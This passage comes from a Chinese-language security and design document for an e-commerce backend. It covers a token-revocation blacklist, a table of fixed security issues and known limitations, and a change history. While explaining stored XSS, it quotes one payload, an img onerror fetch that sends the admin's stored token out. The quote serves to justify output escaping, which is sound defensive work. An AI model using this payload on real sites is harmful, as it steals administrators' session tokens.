manager 若能自行把任何人升級為 admin，角色分層就形同虛設。
另外後端也擋下「改自己的角色」——避免把自己鎖在門外。

---

## 9. 權杖撤銷（Revoked_Tokens）

### 問題

HMAC 簽章權杖是**無狀態**的：簽出去就收不回來。
登出只是前端把權杖丟掉，那張在 7 天有效期內仍然驗得過 ——
被側錄或從裝置上撈走的話，登出等於沒登出。

### 解法

```sql
CREATE TABLE Revoked_Tokens (
    token_hash CHAR(64) PRIMARY KEY,   -- SHA-256(權杖原文)，不存原文
    user_id INT NULL,
    revoked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME NOT NULL,      -- 權杖本身的到期時間
    FOREIGN KEY (user_id) REFERENCES Users(user_id) ON DELETE CASCADE
);
```

```
登出 → INSERT IGNORE INTO Revoked_Tokens (SHA256(token), uid, 權杖的 exp)
每次 require_auth → 驗簽 → 查黑名單 → 命中就 401
```

| 設計 | 理由 |
| --- | --- |
| 只存 **SHA-256 雜湊**，不存原文 | 這張表被讀走也拿不到可用的權杖 |
| `INSERT IGNORE` | 重複登出不該報錯（`token_hash` 是主鍵） |
| 記 `expires_at` | 權杖過期後這筆黑名單就沒有存在意義，可以安全清掉 |

清理（MariaDB.sql 檔尾附了 EVENT 版本）：

```sql
DELETE FROM Revoked_Tokens WHERE expires_at < NOW();
```

> **為什麼不乾脆把權杖都存進資料庫（有狀態 session）？**
> 那樣每次請求都要查一次表才能確認身分。現在的做法是「簽章先擋掉 99% 的無效權杖，
> 只有簽章正確的才需要查黑名單」，而黑名單通常只有幾筆。

---

## 10. 安全模型與已知限制

### 這次補上的

| 項目 | 做法 |
| --- | --- |
| 後台不可未登入瀏覽 | 畫面預設隱藏 + 開頁用權杖問 `GET /users` 確認角色 |
| 角色越權 | 每支 `staff-*` 端點後端驗角色，回 403 |
| 註冊不能自封角色 | `POST /users` 的 role 寫死 `customer` |
| 會員名單外洩 | `GET /users` 改為只讀自己；全名單走 `staff-users` |
| 聊天室偷看 | `assert_room_member()` 每次讀寫都驗 |
| 冒名發言 | `sender_id` 來自權杖，不收前端的 |
| 登出不生效 | `Revoked_Tokens` 黑名單 |
| 儲存型 XSS | 前後台所有 `innerHTML` 都經過 `esc()` 跳脫 |
| 停用帳號 | `require_auth()` 每次現查 `Users.status`，停用**立即生效**（不必等對方的權杖過期） |
| 登出真的生效 | App 與網頁登出時都會呼叫 `/users?action=logout` 把權杖寫進黑名單 |
| 職責分離 | finance / warehouse / logistics 各自只能做自己那一步，**同時檢查「改成什麼」與「原本是什麼」** |
| 金額竄改 | 訂單金額由後端讀購物車自算；付款金額讀 `Orders.total_amount`。前端送的 `expected_total` 只當對帳用 |
| 支付方式竄改 | `PAYMENT_METHODS` 白名單，不接受清單外的字串 |
| 重複付款 | `Payments` 的 `UNIQUE (order_id)` + 應用層先查有無付款紀錄 |
| 資料庫結構不符 | 全域例外攔截把未捕捉的 DB 錯誤轉成 JSON，並提示「請執行 MariaDB-migration.sql」 |
| 權限兩層不一致 🆕 | 端點層與資料列層共用 `BACKOFFICE_ROLES`，新增角色只改一處（見第 8 節） |
| 機密外洩到建置雲端 🆕 | 手機 iOS 版走 EAS 雲端建置，`.easignore` 排除 `db.ini`、`api.php`、SQL；`db.ini` 也補進 `.gitignore` |

> **XSS 這點值得特別說**：後台會把客戶的聊天訊息、商品名稱、會員姓名塞進 `innerHTML`。
> 沒跳脫的話，客戶只要在客服對話打一段 `<img src=x onerror="fetch('...'+localStorage.shop_token)">`，
> 管理員一開後台，權杖就送到攻擊者手上了。

### 仍然存在的限制

| 項目 | 說明 |
| --- | --- |
| 權杖走明文 HTTP | 內網 `http://` 下權杖會裸奔，同網段可側錄。正式環境必須 HTTPS |
| 無法「登出所有裝置」 | 黑名單是逐張權杖。要做全域登出得在 `Users` 加一個 `token_valid_after` 時戳比對 |
| 無密碼強度規則 | `POST /users` 不檢查密碼長度或複雜度 |
| 無登入嘗試次數限制 | 可以無限次猜密碼。正式環境應加上速率限制或帳號鎖定 |
| 後台無操作稽核紀錄 | 誰改了哪張訂單、誰刪了哪件商品，目前沒有留痕 |
| 客服輪詢仍是 HTTP short polling | 每 2~2.5 秒一次請求。正式產品應改用 WebSocket 或 SSE |
| 權限仍綁在角色上 | 已可做到「只能收款、不能出貨」這種職責分離，但每種組合都得新增一個角色。要做到自由組合（如「能看訂單也能改商品，但不能停用帳號」）仍需要一張權限表 |
| 舊制狀態值仍在 ENUM | `Orders.status` 保留 `pending` / `paid` 供歷史資料使用。新訂單不會再產生，但查詢時要記得它們存在 |
| 倉管可出貨未收款訂單 | 這是**刻意**的 —— 貨到付款本來就先出貨才收錢。系統只標紅提醒，不強制阻擋，是否放行屬營運政策 |
| 手機 App 需重新打包才會跟上 | 訂單狀態標籤等前端字串包在 App 內（Android APK 與 iOS 版皆然）。後端改了狀態值，舊版 App 會顯示原始英文（功能不受影響） |

---

## 11. 變更歷程

依時間順序，每一輪的主題與關鍵決策。

### 第 1 輪 — 角色與後台骨架
新增 `manager` 角色、拆分商品／分類管理、建立 `manager.html`、
為 `admin.html` 加登入閘門、客服聊天室改成 **customer ↔ manager** 成員制。

### 第 2 輪 — 補三個既有缺口
庫存檢查（購物車與下單）、下單扣庫存（條件式扣減防超賣）、訂單資料擁有者驗證。

### 第 3 輪 — 不能相信前端
身分改用 **HMAC 簽章權杖**（`user_id` 一律從權杖解出）；
訂單與付款**金額改由後端計算**，前端的 `expected_total` 降級為對帳用。

### 第 4 輪 — 帳號停用
`Users.status`；停用在 `require_auth()` 每次現查，**立即生效**不必等權杖過期。

### 第 5 輪 — 統一登入
登入從三支網頁抽離成 [login.html](login.html)；
**導向頁面由後端決定**（`home_page_for_role()`），前端只照做。
權杖鍵名統一為 `shop_token`。

### 第 6 輪 — 支付方式與狀態分流
支付方式白名單 + 即時／延後付款分流；
`Payments.paid_at` 改為可 NULL；訂單完整資訊端點 `GET /orders?order_id=X`。

### 第 7 輪 — 營運角色與履約流程
新增 `finance` / `warehouse` / `logistics` 三角色與三支後台頁面；
**訂單狀態改為純履約進度**，付款狀態獨立 —— 因為貨到付款是「先出貨才收錢」，
用同一個欄位表達必然打結。

### 第 8 輪 — 權限清單收斂與介面修正
- **財務點「明細」顯示找不到資料**：後台角色清單寫了三處只改一處，抽成 `BACKOFFICE_ROLES` 單一來源（見第 8 節）。
- **`login.html` 角色說明補齊六種**，並補上三個營運角色徽章的 CSS。
- **金額顯示千分位**：`index.html`、`backoffice.js`、`ops.js`、`App.js` 四份 `money()` 行為一致（`$29,698` / `$1,234.50`）。
  千分位只進畫面，送往 API 的 `expected_total` 仍是原始數字。

### 第 9 輪 — 手機 App 出 iOS 版
同一份 `App.js` 經 EAS 雲端建置產出 iOS 版（目前為模擬器版 1.2.3 build 1）。
後端不用改；但 iOS 17 起 ATS 預設擋 IP 位址，`app.json` 已為內網 IP 設例外。
詳見 [README-打包APK.md 第十節](README-打包APK.md)。

---

### 相關文件

- [App.js-說明文件.md](App.js-說明文件.md) —— 手機 App 端的完整說明
- [README-打包APK.md](README-打包APK.md) —— Android APK 與 iOS（EAS 雲端建置）打包流程
- [README-改寫說明.md](README-改寫說明.md) —— 舊語法 → 新版本的改寫紀錄
